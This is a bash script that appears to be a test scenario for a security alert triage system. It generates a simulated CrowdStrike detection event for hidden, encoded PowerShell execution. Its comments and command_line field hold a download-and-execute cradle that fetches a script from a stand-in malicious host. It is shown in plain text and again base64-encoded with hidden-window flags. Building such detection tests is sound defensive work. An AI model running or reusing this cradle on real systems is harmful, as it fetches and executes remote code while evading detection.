#!/usr/bin/env bash
# =============================================================================
# Scenario: Encoded PowerShell Command
# =============================================================================
# MITRE ATT&CK: T1059.001 — PowerShell
# Tactic:     Execution
# Severity:   HIGH
#
# What this simulates:
#   An attacker using PowerShell's -EncodedCommand parameter to execute
#   a base64-encoded payload. This is a common evasion technique — the
#   actual command is hidden in the encoded string, making it harder to
#   detect via simple command line matching.
#
# Detection signals:
#   - Command line: contains "-enc" followed by a long base64 string
#   - The encoded payload decodes to: IEX((New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1'))
#   - This is a download cradle — same as the lateral stage 1 but encoded
#
# Expected triage: HIGH verdict. The encoded PowerShell playbook should
# match this (ENRICH + MONITOR, no approval needed).
# =============================================================================

SCENARIO_NAME="powershell_encoded"
SCENARIO_SOURCE="crowdstrike"
SCENARIO_SEVERITY="HIGH"
SCENARIO_TACTIC="Execution"
SCENARIO_TECHNIQUE="T1059.001"

TIMESTAMP=$(date +%s)
DETECT_ID="cs-${TIMESTAMP}"

# build_payload — Generate the CrowdStrike-format encoded PowerShell payload.
# Args: $1: tenant_id (default: "default-tenant")
build_payload() {
    local tenant_id="${1:-default-tenant}"
    cat <<EOF
{
    "detect_id": "${DETECT_ID}",
    "customer_id": "${tenant_id}",
    "timestamp": ${TIMESTAMP},
    "sensor": {
        "hostname": "win-workstation-03"
    },
    "process": {
        "user_name": "CORP\\\\jdoe",
        "file_name": "powershell.exe",
        "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBzAGkAdABlAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
        "sha256": "fedcba0987654321fedcba0987654321fedcba0987654321fedcba0987654321"
    },
    "tactic": "${SCENARIO_TACTIC}",
    "technique": "${SCENARIO_TECHNIQUE}",
    "severity": "${SCENARIO_SEVERITY}"
}
EOF
}
